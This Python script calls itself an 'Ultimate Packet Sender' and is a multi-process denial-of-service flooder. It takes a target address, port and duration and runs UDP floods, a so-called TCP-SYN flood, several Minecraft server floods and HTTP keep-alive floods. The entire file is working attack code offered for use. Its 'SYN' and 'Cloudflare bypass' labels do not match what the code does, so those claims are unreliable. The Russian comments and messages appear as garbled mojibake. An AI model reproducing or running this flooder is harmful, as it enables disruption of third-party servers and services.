import socket
import random
import threading
import multiprocessing
import sys
import time
import colorama
from colorama import Fore, Style
import signal

colorama.init(autoreset=True)

def animate(stop_event, target_ip, target_port, protocol, duration, workers):
    """–ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å –≤—ã–≤–æ–¥–æ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞—Ç–∞–∫–µ."""
    time.sleep(5)  # –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –∞–Ω–∏–º–∞—Ü–∏–∏
    while not stop_event.is_set():
        sys.stdout.write(f"\r{Fore.CYAN}üöÄ –ê—Ç–∞–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ {Fore.YELLOW}{target_ip}:{target_port}{Fore.CYAN} | {protocol} | {duration}s | –ú–æ—â–Ω–æ—Å—Ç—å: {workers} –ø–æ—Ç–æ–∫–æ–≤ {random.choice(['üî•', 'üí•', '‚ö°', 'üöÄ'])} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def send_udp_packets(target_ip, target_port, packet_size=1024, duration=10):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –º–Ω–æ–∂–µ—Å—Ç–≤–∞ UDP-–ø–∞–∫–µ—Ç–æ–≤."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(packet_size)  # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏

    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.sendto(packet, (target_ip, target_port))  # –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–∫–µ—Ç–æ–≤
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ UDP: {e}{Style.RESET_ALL}")
            break
    
    sock.close()

def tcp_syn_flood(target_ip, target_port, duration):
    """–ê—Ç–∞–∫–∞ TCP-SYN flood."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ TCP-SYN –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(b"\x00\x00\x00\x00")  # –û—Ç–ø—Ä–∞–≤–∫–∞ SYN –ø–∞–∫–µ—Ç–∞
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ TCP-SYN: {e}{Style.RESET_ALL}")
            break
    sock.close()

# Minecraft Layer 7 Floods
def mc_cps_flood(target_ip, target_port, duration):
    """Flood CPS (Clicks per second) –¥–ª—è Minecraft —Å–µ—Ä–≤–µ—Ä–æ–≤."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ MC-CPS –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(random._urandom(1024))  # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö (–∫–∞–∫ –∏–º–∏—Ç–∞—Ü–∏—è CPS)
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ MC-CPS: {e}{Style.RESET_ALL}")
            break
    sock.close()

def mc_ping_flood(target_ip, target_port, duration):
    """Flood Ping –ø–∞–∫–µ—Ç–æ–≤ –¥–ª—è Minecraft —Å–µ—Ä–≤–µ—Ä–æ–≤."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ MC-PING –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(b"\x01\x00\x00\x00")  # –ü—Ä–∏–º–µ—Ä Ping –ø–∞–∫–µ—Ç–∞
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ MC-PING: {e}{Style.RESET_ALL}")
            break
    sock.close()

def mc_handshake_flood(target_ip, target_port, duration):
    """Flood Handshake –ø–∞–∫–µ—Ç–æ–≤ –¥–ª—è Minecraft —Å–µ—Ä–≤–µ—Ä–æ–≤."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ MC-HANDSHAKE –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(b"\x00\x01\x02\x03\x04")  # –ü—Ä–∏–º–µ—Ä Handshake –ø–∞–∫–µ—Ç–∞
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ MC-HANDSHAKE: {e}{Style.RESET_ALL}")
            break
    sock.close()

def mc_tcpbypass_flood(target_ip, target_port, duration):
    """Flood TCP –∑–∞–ø—Ä–æ—Å–æ–≤ –¥–ª—è Minecraft —Å–µ—Ä–≤–µ—Ä–æ–≤."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ MC-TCPBYPASS –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(random._urandom(1024))  # –û—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã—Ö TCP –ø–∞–∫–µ—Ç–æ–≤
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ MC-TCPBYPASS: {e}{Style.RESET_ALL}")
            break
    sock.close()

# HTTP Layer 7 Floods
def http_out_flood(target_ip, target_port, duration):
    """Strong HTTP flood with Cloudflare bypass method."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ HTTP-OUT –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\nConnection: keep-alive\r\n\r\n"
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(headers.encode())
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ HTTP-OUT: {e}{Style.RESET_ALL}")
            break
    sock.close()

def http_misc_flood(target_ip, target_port, duration):
    """Universal HTTP flood for Cloudflare Managed/Interactive bypass."""
    print(f"{Fore.YELLOW}üö® –ó–∞–ø—É—â–µ–Ω–∞ –∞—Ç–∞–∫–∞ HTTP-MISC –Ω–∞ {target_ip}:{target_port} {duration}s{Style.RESET_ALL}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    
    headers = "GET / HTTP/1.1\r\nHost: " + target_ip + "\r\nConnection: keep-alive\r\n\r\n"
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock.send(headers.encode())
            time.sleep(0.01)  # –ú–∞–ª–µ–Ω—å–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –æ—Ç–ø—Ä–∞–≤–∫–∞–º–∏ –ø–∞–∫–µ—Ç–æ–≤
        except Exception as e:
            print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ HTTP-MISC: {e}{Style.RESET_ALL}")
            break
    sock.close()

def run_all_protocols(target_ip, target_port, duration, workers):
    """–ó–∞–ø—É—Å–∫ –≤—Å–µ—Ö –ø—Ä–æ—Ç–æ–∫–æ–ª–æ–≤ –∏ –º–µ—Ç–æ–¥–æ–≤ –∞—Ç–∞–∫."""
    process_list = []
    for _ in range(workers):
        process_list.append(multiprocessing.Process(target=send_udp_packets, args=(target_ip, target_port, 1024, duration)))
        process_list.append(multiprocessing.Process(target=tcp_syn_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=mc_cps_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=mc_ping_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=mc_handshake_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=mc_tcpbypass_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=http_out_flood, args=(target_ip, target_port, duration)))
        process_list.append(multiprocessing.Process(target=http_misc_flood, args=(target_ip, target_port, duration)))
    
    for process in process_list:
        process.start()

    for process in process_list:
        process.join()

def run_attack(target_ip, target_port, protocol, duration, workers):
    """–§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –º–Ω–æ–≥–æ–ø–æ—Ç–æ—á–Ω–æ–π –∏ –º–Ω–æ–≥–æ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–Ω–æ–π –∞—Ç–∞–∫–∏."""
    process_list = []
    stop_event = multiprocessing.Event()
    animation_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers))
    animation_thread.start()
    
    if protocol == "ALL":
        run_all_protocols(target_ip, target_port, duration, workers)
    
    stop_event.set()
    animation_thread.join()

def banner():
    """–í—ã–≤–æ–¥ –±–∞–Ω–Ω–µ—Ä–∞"""
    print(f"{Fore.MAGENTA}==================================")
    print(f"üöÄ {Fore.YELLOW}üí£ Ultimate Packet Sender üí£ {Fore.MAGENTA}üöÄ")
    print(f"================================== {Style.RESET_ALL}")

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}‚ùå –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    banner()
    
    if len(sys.argv) != 4:
        print(f"{Fore.RED}‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: python z_old.py ip:port protocol time{Style.RESET_ALL}")
        sys.exit(1)
    
    target = sys.argv[1]
    protocol = sys.argv[2].upper()
    duration = int(sys.argv[3])
    workers = multiprocessing.cpu_count() * 2  # –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≤ 2 —Ä–∞–∑–∞ –±–æ–ª—å—à–µ –ø–æ—Ç–æ–∫–æ–≤, —á–µ–º —è–¥–µ—Ä
    
    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print(f"{Fore.RED}üö® –û—à–∏–±–∫–∞: –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ip:port{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"{Fore.GREEN}üí• –ê—Ç–∞–∫–∞ –Ω–∞—á–∞–ª–∞—Å—å –Ω–∞ {target_ip}:{target_port} —á–µ—Ä–µ–∑ {protocol} –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥! üî•{Style.RESET_ALL}")
    run_attack(target_ip, target_port, protocol, duration, workers)
    print(f"{Fore.BLUE}‚úÖ üéØ –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–∫–µ—Ç–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!{Style.RESET_ALL}")
